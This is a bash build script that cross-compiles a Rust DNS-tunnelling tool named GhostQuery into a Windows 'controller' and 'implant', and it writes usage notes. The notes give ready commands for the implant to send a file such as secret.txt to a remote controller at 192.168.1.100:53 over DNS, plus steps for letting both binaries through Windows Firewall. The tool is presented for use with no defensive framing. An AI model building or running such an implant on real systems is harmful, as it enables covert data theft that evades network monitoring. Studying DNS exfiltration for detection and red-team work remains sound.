#!/bin/bash
# Build script for Windows executables

set -e

echo "Building GhostQuery for Windows (x86_64)..."

# Check if cross is installed
if ! command -v cross &> /dev/null; then
    echo "Installing cross for cross-compilation..."
    cargo install cross
fi

# Build for Windows
echo "Building controller..."
cross build --release --target x86_64-pc-windows-gnu --bin gq-controller

echo "Building implant..."
cross build --release --target x86_64-pc-windows-gnu --bin gq-implant

# Create dist directory
mkdir -p dist/windows

# Copy binaries
cp target/x86_64-pc-windows-gnu/release/gq-controller.exe dist/windows/
cp target/x86_64-pc-windows-gnu/release/gq-implant.exe dist/windows/

# Create usage instructions
cat > dist/windows/USAGE.txt << 'EOF'
GhostQuery Protocol - Windows Binaries
======================================

CONTROLLER (Server - receives data):
------------------------------------
Run as Administrator (requires port 53):

    gq-controller.exe --bind 0.0.0.0:53 --domain ghost.local --output C:\received

Or use unprivileged port:

    gq-controller.exe --bind 0.0.0.0:5353 --domain ghost.local --output C:\received


IMPLANT (Client - sends data):
------------------------------
    gq-implant.exe --file secret.txt --domain ghost.local --server 192.168.1.100:53 --key <64-hex-chars>


TESTING LOCALLY:
---------------
1. Open PowerShell as Administrator
2. Run controller:
   .\gq-controller.exe -b 127.0.0.1:5353 -d test.local -o .\output -v

3. Open another PowerShell window
4. Create test file:
   echo "Test data" > test.txt

5. Run implant:
   .\gq-implant.exe -f test.txt -d test.local -s 127.0.0.1:5353 -k <key-from-step-2> -v

6. Check .\output\ directory for received file


KEY SHARING:
-----------
The controller will print a master key on startup if you don't provide one.
Copy this key and use it with the implant's --key parameter.

Example key: a1b2c3d4e5f6...  (64 hexadecimal characters)


FIREWALL:
--------
You may need to allow the programs through Windows Firewall:
- Control Panel > Windows Defender Firewall > Allow an app
- Add both gq-controller.exe and gq-implant.exe
EOF

echo ""
echo "Build complete!"
echo "Windows binaries are in: dist/windows/"
echo ""
ls -lh dist/windows/

